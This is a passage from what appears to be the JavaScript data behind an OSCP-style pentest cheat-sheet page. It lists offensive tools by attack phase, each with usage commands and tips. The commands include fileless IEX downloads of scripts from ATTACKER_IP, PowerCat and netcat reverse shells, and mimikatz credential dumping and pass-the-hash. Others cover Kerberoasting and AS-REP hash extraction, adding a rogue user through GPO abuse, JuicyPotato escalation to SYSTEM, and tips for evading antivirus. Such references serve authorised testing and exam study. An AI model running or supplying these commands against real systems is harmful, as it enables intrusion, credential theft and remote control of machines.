                  <li>After gaining initial access to Windows</li>
                  <li>To find privilege escalation vectors</li>
                  <li>When PowerShell is restricted</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# Upload and run
winpeasx64.exe
# Quiet mode
winpeasx64.exe quiet
# Only check specific sections
winpeasx64.exe userinfo
# Output to file
winpeasx64.exe > C:\\temp\\winpeas.txt</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Look for <span style="color:#ff6b6b;">RED</span> sections — high priority findings</li>
                  <li>Check "Interesting Processes" for antivirus or EDR</li>
                  <li>Search for passwords in memory or files</li>
                  <li>For OSCP: Often finds unquoted service paths, DLL hijacking</li>
                </ul>
              `,
              tags: ["windows", "privesc", "enum", "peass", "executable", "privilege escalation"],
              phase: "01_recon_enum"
            },
            {
              name: "chisel",
              desc: "Tunneling for pivoting",
              file: "chisel",
              dup: "from 01",
              detail: `
                <div style="color:#00d1b2;font-weight:600;margin-bottom:10px;font-size:1.2rem;">📌 What is chisel?</div>
                <p>A fast, encrypted TCP/UDP tunnel over HTTP(S). Create SOCKS proxies or port forwards through firewalls. Essential for pivoting in internal networks.</p>
                <div style="color:#ff3860;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>When you compromise a machine inside a network</li>
                  <li>To access internal services (SMB, RDP, databases)</li>
                  <li>To route tools like nmap, bloodhound, or metasploit through the pivot</li>
                </ul>
                <div style="color:#3273dc;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">🛠️ How to Use It</div>
                <pre style="background:#1a1a1a;padding:15px;border-radius:8px;overflow-x:auto;color:#ffcb6b;font-family:'JetBrains Mono',monospace;margin:10px 0;">
# On your attacking machine (server)
./chisel server -p 8080 --reverse
# On compromised target (client)
./chisel client YOUR_IP:8080 R:socks
# Now set proxychains
proxychains nmap -sT -Pn -n -p 80,445,3389 192.168.1.0/24
# Forward single port
./chisel client YOUR_IP:8080 R:3389:192.168.1.10:3389</pre>
                <div style="color:#ffdd57;font-weight:600;margin:20px 0 10px;font-size:1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left:20px;line-height:1.6;color:#e0e0e0;">
                  <li>Use <code>--auth user:pass</code> for extra security</li>
                  <li>Works over HTTP — often bypasses egress filters</li>
                  <li>For OSCP: SOCKS proxy + proxychains is your best friend</li>
                  <li>If blocked, try DNS or ICMP tunneling alternatives</li>
                </ul>
              `,
              tags: ["tunnel", "pivot", "socks", "proxy", "firewall bypass", "proxychains", "chisel"],
              phase: "01_recon_enum"
            }
          ]
        }
      ]
    },
    {
      name: "02_initial_access — Gaining Initial Access",
      tools: [
        {
          cat: "client_side_attacks/",
          items: [
            {
              name: "exploit.lnk, payload.dll",
              desc: "Malicious files for social engineering",
              file: "client_side.zip",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is this?</div>
                <p>Archive containing malicious LNK, SCF, or DLL files for client-side attacks (e.g., via SMB share or email).</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Client-side attacks in AD environments</li>
                  <li>SMB share attacks (e.g., Responder + LNK files)</li>
                  <li>Email phishing with malicious attachments</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Place on SMB share
cp exploit.lnk /var/www/html/
# With Responder
python3 Responder.py -I eth0 -rdw
# DLL hijacking
# Replace legitimate DLL with malicious one
cp payload.dll "\\\\target\\share\\vuln_app\\"
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>LNK files can execute commands when viewed in Explorer</li>
                  <li>SCF files can trigger icon requests to your SMB server</li>
                  <li>DLL hijacking requires write access to app directory</li>
                  <li>For OSCP: Often used in retired machines like Responder scenarios</li>
                </ul>
              `,
              tags: ["client-side", "social engineering", "lnk", "dll", "phishing", "responder", "smb"],
              phase: "02_initial_access"
            }
          ]
        },
        {
          cat: "git_dumper/",
          items: [
            {
              name: "gitdumper.sh",
              desc: "Extract data from exposed .git repos",
              file: "gitdumper.sh",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is gitdumper.sh?</div>
                <p>Part of git-tools — downloads and reconstructs exposed .git directories from web servers.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When you find /.git/ accessible on web server</li>
                  <li>To recover source code, config files, credentials</li>
                  <li>For further vulnerability analysis</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Dump the .git folder
./gitdumper.sh http://target.com/.git/ output_folder
# Reconstruct the repo
cd output_folder
git checkout .
# View commit history
git log -p
# Check for secrets
git grep -i "password\|secret\|key"
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Always check <code>/.git/config</code> and <code>/.git/HEAD</code> manually first</li>
                  <li>Look for AWS keys, database passwords, API tokens in commits</li>
                  <li>Use <code>truffleHog</code> or <code>git-secrets</code> for automated secret finding</li>
                  <li>For OSCP: Has appeared in multiple retired machines</li>
                </ul>
              `,
              tags: ["git", "source leak", "recon", "initial access", "git dumper", "source code"],
              phase: "02_initial_access"
            }
          ]
        },
        {
          cat: "cross_compiling/",
          items: [
            {
              name: "adduser.c, evil.dll",
              desc: "Source for compiling custom payloads",
              file: "payloads.zip",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is this?</div>
                <p>Source code (C, C#, etc.) for compiling custom payloads — e.g., adding users, reverse shells, or DLLs.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When you need to bypass AV/EDR</li>
                  <li>For custom payloads not available in msfvenom</li>
                  <li>When you need to add users or escalate privileges</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Compile C payload (Windows)
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
# Compile C payload (Linux)
gcc adduser.c -o adduser
# Cross-compile DLL
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c
# Execute on target
./adduser
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Use <code>mingw-w64</code> for Windows cross-compilation</li>
                  <li>Strip symbols: <code>strip adduser.exe</code> to reduce size</li>
                  <li>Obfuscate strings to evade AV detection</li>
                  <li>For OSCP: Essential for custom privesc or bypassing restrictions</li>
                </ul>
              `,
              tags: ["source", "compile", "custom", "bypass", "payload", "cross-compile", "mingw"],
              phase: "02_initial_access"
            }
          ]
        },
        {
          cat: "utils",
          items: [
            {
              name: "PowerCat.ps1",
              desc: "Reverse shell & tunneling",
              file: "PowerCat.ps1",
              dup: "from 01_recon_enum",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is PowerCat?</div>
                <p>PowerShell implementation of Netcat. Can listen, connect, transfer files, and execute commands.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When netcat is not available on Windows</li>
                  <li>For AV evasion (PowerShell is often allowed)</li>
                  <li>File transfer in restricted environments</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Load in memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerCat.ps1')
# Reverse shell
powercat -c ATTACKER_IP -p 4444 -e cmd
# Bind shell
powercat -l -p 4444 -e cmd
# File transfer (receiver)
powercat -l -p 4444 -of received_file.txt
# File transfer (sender)
powercat -c ATTACKER_IP -p 4444 -i file_to_send.txt
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Use <code>-g</code> to generate a script for persistence</li>
                  <li>Combine with <code>Invoke-Obfuscation</code> to evade AV</li>
                  <li>For OSCP: Essential when you get RCE but no netcat</li>
                  <li>Use <code>-dns</code> mode for DNS tunneling if HTTP is blocked</li>
                </ul>
              `,
              tags: ["powershell", "netcat", "reverse shell", "windows", "av evasion", "file transfer"],
              phase: "02_initial_access"
            }
          ]
        }
      ]
    },
    {
      name: "03_active_directory — AD Enumeration & Exploitation",
      tools: [
        {
          cat: "Enumeration Scripts",
          items: [
            {
              name: "PowerView.ps1",
              desc: "Active Directory reconnaissance",
              file: "PowerView.ps1",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is PowerView.ps1?</div>
                <p>A PowerShell toolkit for Active Directory enumeration. Discover users, groups, computers, GPOs, trusts, and ACLs. Essential for AD attack path mapping.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>After gaining foothold in an AD environment</li>
                  <li>To map attack paths to Domain Admin</li>
                  <li>To find misconfigured ACLs or privileged groups</li>
                  <li>To identify high-value targets (SQL, Exchange, DCs)</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Load in memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerView.ps1')
# Get domain info
Get-NetDomain
# List domain admins
Get-NetGroupMember "Domain Admins"
# Find computers where user has local admin
Find-LocalAdminAccess
# Get SPNs (for kerberoasting)
Get-NetUser -SPN
# Get ACLs for interesting objects
Get-ObjectAcl -Identity "Domain Admins" -ResolveGUIDs
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Combine with <code>SharpHound</code> for BloodHound data</li>
                  <li>Look for <code>GenericAll</code>, <code>WriteDACL</code>, <code>ForceChangePassword</code> rights</li>
                  <li>Use <code>-Domain</code> flag in multi-domain environments</li>
                  <li>For OSCP: Focus on <code>Get-NetUser</code>, <code>Get-NetComputer</code>, <code>Find-LocalAdminAccess</code></li>
                </ul>
              `,
              tags: ["powershell", "ad", "enum", "bloodhound", "powerview", "active directory", "acl"],
              phase: "03_active_directory"
            },
            {
              name: "Get-SPN.ps1",
              desc: "Enumerate Service Principal Names",
              file: "Get-SPN.ps1",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is Get-SPN.ps1?</div>
                <p>Scripts to request Kerberos service tickets (SPNs) and crack them offline for passwords.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>For Kerberoasting attacks</li>
                  <li>When you have read access to AD but no admin privileges</li>
                  <li>To crack service account passwords</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Load script
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Get-SPN.ps1')
# Request SPNs
Get-SPN -type service -search "MSSQL*"
# Request all SPNs
Get-SPN -type service -search "*"
# Save to file for cracking
Get-SPN -type service -search "*" | Out-File spns.txt
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Look for SPNs with weak passwords (service accounts often have them)</li>
                  <li>Crack with hashcat mode 13100: <code>hashcat -m 13100 spn_hashes.txt rockyou.txt</code></li>
                  <li>Use <code>Invoke-Kerberoast</code> from Empire for more features</li>
                  <li>For OSCP: Common attack vector in AD machines</li>
                </ul>
              `,
              tags: ["kerberoast", "spn", "tickets", "crack", "ad", "hashcat", "powershell"],
              phase: "03_active_directory"
            },
            {
              name: "GetNPUsers.py",
              desc: "Find AS-REP roastable users",
              file: "GetNPUsers.py",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is GetNPUsers.py?</div>
                <p>Impacket script to find AS-REP roastable users (no Kerberos pre-auth).</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When you have a list of usernames</li>
                  <li>To find accounts without Kerberos pre-authentication</li>
                  <li>For password cracking attacks</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Check single user
python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.10 corp.local/user
# Check list of users
python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.10 -usersfile users.txt corp/
# Output hashes for cracking
python3 GetNPUsers.py -no-pass -dc-ip 10.10.10.10 -usersfile users.txt corp/ -outputfile asrep_hashes.txt
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Crack with hashcat mode 18200: <code>hashcat -m 18200 asrep_hashes.txt rockyou.txt</code></li>
                  <li>Look for service accounts or legacy accounts</li>
                  <li>Combine with <code>xato-net-10-million-usernames.txt</code></li>
                  <li>For OSCP: Appears in AD-focused machines</li>
                </ul>
              `,
              tags: ["asrep roast", "impacket", "kerberos", "no preauth", "crack", "hashcat"],
              phase: "03_active_directory"
            }
          ]
        },
        {
          cat: "Exploitation Tools",
          items: [
            {
              name: "SharpHound.exe",
              desc: "Collect data for BloodHound",
              file: "SharpHound.exe",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is SharpHound.exe?</div>
                <p>.NET collector for BloodHound — gathers AD relationships for graph-based attack path analysis.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When you need to map complex AD attack paths</li>
                  <li>To find shortest path to Domain Admin</li>
                  <li>For comprehensive AD enumeration</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Basic collection
SharpHound.exe -c All
# Stealthier collection
SharpHound.exe -c GPOLocalGroup,Session,LoggedOn
# Collect from specific OU
SharpHound.exe -c All -d corp.local -ou "OU=Sales,DC=corp,DC=local"
# Output to specific folder
SharpHound.exe -c All -OutputDirectory C:\\temp
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Use <code>-c All</code> for complete data (but noisy)</li>
                  <li>Use <code>-c GPOLocalGroup,Session,LoggedOn</code> for stealth</li>
                  <li>Upload JSON files to BloodHound GUI for analysis</li>
                  <li>For OSCP: Essential for complex AD machines</li>
                </ul>
              `,
              tags: ["bloodhound", "ad", "graph", "sharp", "collector", "attack path"],
              phase: "03_active_directory"
            },
            {
              name: "SharpGPOAbuse.exe",
              desc: "Abuse Group Policy Objects",
              file: "SharpGPOAbuse.exe",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is SharpGPOAbuse.exe?</div>
                <p>Tool to exploit Group Policy Object permissions for RCE or privilege escalation.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When you have write access to GPOs</li>
                  <li>To execute commands on all computers in OU</li>
                  <li>For domain-wide privilege escalation</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Find vulnerable GPOs with PowerView
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Identity $_.Name}
# Add user to local admin group
SharpGPOAbuse.exe --AddLocalAdmin --UserAccount "CORP\\john" --GPOName "Vulnerable GPO"
# Execute command on all machines
SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --UserAccount "CORP\\john" --Command "cmd.exe" --Arguments "/c net user hacker Password123! /add" --GPOName "Vulnerable GPO"
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>First find GPOs you can modify with <code>Get-ObjectAcl</code></li>
                  <li>Use <code>--AddLocalAdmin</code> for quick privilege escalation</li>
                  <li>Use <code>--AddUserTask</code> for command execution</li>
                  <li>For OSCP: Powerful but requires specific permissions</li>
                </ul>
              `,
              tags: ["gpo", "abuse", "privesc", "rce", "sharp", "group policy", "domain escalation"],
              phase: "03_active_directory"
            }
          ]
        },
        {
          cat: "Credential Tools",
          items: [
            {
              name: "mimikatz.exe",
              desc: "Dump credentials from memory",
              file: "mimikatz.exe",
              dup: "from 05",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is mimikatz.exe?</div>
                <p>The legendary Windows post-exploitation tool. Extracts plaintext passwords, hashes, PINs, and Kerberos tickets from memory (LSASS). Essential for AD pentests.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>After gaining admin/system access on Windows</li>
                  <li>To dump domain credentials from Domain Controllers</li>
                  <li>To extract Kerberos tickets for Pass-the-Ticket attacks</li>
                  <li>To get plaintext passwords for lateral movement</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Basic usage
mimikatz.exe
privilege::debug
token::elevate
sekurlsa::logonpasswords
# Dump hashes only
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:HASH_HERE
# Export tickets
sekurlsa::tickets /export
# Pass-the-hash
sekurlsa::pth /user:admin /domain:corp /ntlm:HASH /run:cmd.exe
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Run as Administrator — or you’ll get “ERROR kuhl_m_privilege”</li>
                  <li>Use <code>token::elevate</code> if you’re already SYSTEM</li>
                  <li>Defender blocks it — rename exe or use reflective loading</li>
                  <li>For OSCP: Focus on <code>sekurlsa::logonpasswords</code> and <code>sekurlsa::pth</code></li>
                </ul>
              `,
              tags: ["mimikatz", "credentials", "lsass", "hashes", "tickets", "pass the hash", "kerberos"],
              phase: "03_active_directory"
            },
            {
              name: "Rubeus.exe",
              desc: "Kerberos ticket manipulation",
              file: "Rubeus.exe",
              dup: "from 05",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is Rubeus.exe?</div>
                <p>C# tool for Kerberos interaction — request, abuse, and forge tickets (TGTs, TGS, Silver/Golden). </p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>For Kerberos attacks (Golden Ticket, Silver Ticket)</li>
                  <li>To request TGTs/TGSs for specific users</li>
                  <li>For Pass-the-Ticket attacks</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Ask for TGT
Rubeus.exe asktgt /user:john /domain:corp.local /password:Password123!
# Dump current tickets
Rubeus.exe triage
# Pass-the-Ticket
Rubeus.exe ptt /ticket:ticket.kirbi
# Golden Ticket (need krbtgt hash)
Rubeus.exe golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH_HERE
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Use <code>asktgt</code> for legitimate TGT requests</li>
                  <li>Use <code>dump</code> to extract tickets from memory</li>
                  <li>Golden Ticket requires krbtgt account hash</li>
                  <li>For OSCP: Focus on <code>asktgt</code> and <code>ptt</code></li>
                </ul>
              `,
              tags: ["kerberos", "rubeus", "tickets", "ptt", "otp", "golden ticket", "silver ticket"],
              phase: "03_active_directory"
            }
          ]
        }
      ]
    },
    {
      name: "04_privilege_escalation — Privilege Escalation",
      tools: [
        {
          cat: "windows/",
          items: [
            {
              name: "PowerUp.ps1",
              desc: "Automated Windows privilege escalation",
              file: "PowerUp.ps1",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is PowerUp.ps1?</div>
                <p>Automated Windows privilege escalation checker — finds misconfigurations, unquoted paths, weak services.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>After gaining low-priv access on Windows</li>
                  <li>To find quick privilege escalation vectors</li>
                  <li>When manual enumeration is too time-consuming</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Load in memory
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
# Run all checks
Invoke-AllChecks
# Check specific vector
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-RegistryAlwaysInstallElevated
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Look for <code>ModifiableService</code> and <code>UnquotedServicePath</code></li>
                  <li>Check <code>Get-RegistryAlwaysInstallElevated</code> for easy privesc</li>
                  <li>Use <code>-Exclude</code> to skip noisy checks</li>
                  <li>For OSCP: Often finds unquoted service paths</li>
                </ul>
              `,
              tags: ["windows", "privesc", "automation", "powerup", "powershell", "privilege escalation"],
              phase: "04_privilege_escalation"
            },
            {
              name: "JuicyPotato.exe",
              desc: "Exploit impersonation privileges",
              file: "JuicyPotato.exe",
              cat: "potatoes/",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is JuicyPotato.exe?</div>
                <p>Exploits SeImpersonate/SeAssignPrimaryToken privileges to escalate from service accounts to SYSTEM. Famous for Windows Server 2016/2019 exploits.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>When you have a shell as a service account</li>
                  <li>On Windows Server 2016/2019 with default config</li>
                  <li>When other privesc methods fail</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Check privileges first
whoami /priv
# If SeImpersonate or SeAssignPrimaryToken is present:
JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c {CLSID}
# Common CLSIDs:
# {e60687f7-01a1-40aa-86ac-db1cbf673334} - Windows Server 2016+
# {f87b7af2-e5c1-4c9d-a15e-5381e9150371} - Windows 10
# Execute payload
JuicyPotato.exe -l 9999 -p c:\\temp\
c.exe -a "ATTACKER_IP 4444 -e cmd.exe" -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Test CLSIDs one by one — not all work on all systems</li>
                  <li>If blocked, try <code>RoguePotato</code> or <code>PrintSpoofer</code></li>
                  <li>For OSCP: This is a common privesc vector — memorize the syntax</li>
                  <li>Always check privileges with <code>whoami /priv</code> first</li>
                </ul>
              `,
              tags: ["windows", "privesc", "juicypotato", "impersonate", "clsid", "system", "privilege escalation"],
              phase: "04_privilege_escalation"
            },
            {
              name: "winpeasx64.exe",
              desc: "Comprehensive Windows enumeration",
              file: "winpeasx64.exe",
              dup: "from 01",
              detail: `
                <div style="color: #00d1b2; font-weight: 600; margin-bottom: 10px; font-size: 1.2rem;">📌 What is winpeasx64.exe?</div>
                <p>Windows Privilege Escalation Awesome Script — .exe version for easy execution on Windows targets.</p>
                <div style="color: #ff3860; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🎯 When Do You Need It?</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>After gaining initial access to Windows</li>
                  <li>To find privilege escalation vectors</li>
                  <li>When PowerShell is restricted</li>
                </ul>
                <div style="color: #3273dc; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">🛠️ How to Use It</div>
                <pre style="background: #1a1a1a; padding: 15px; border-radius: 8px; overflow-x: auto; color: #ffcb6b; font-family: 'JetBrains Mono', monospace; margin: 10px 0;">
# Upload and run
winpeasx64.exe
# Quiet mode
winpeasx64.exe quiet
# Only check specific sections
winpeasx64.exe userinfo
# Output to file
winpeasx64.exe > C:\\temp\\winpeas.txt
                </pre>
                <div style="color: #ffdd57; font-weight: 600; margin: 20px 0 10px; font-size: 1.2rem;">💡 Pro Tips</div>
                <ul style="margin-left: 20px; line-height: 1.6; color: #e0e0e0;">
                  <li>Look for <span style="color: #ff6b6b;">RED</span> sections — high priority findings</li>
                  <li>Check "Interesting Processes" for antivirus or EDR</li>
                  <li>Search for passwords in memory or files</li>
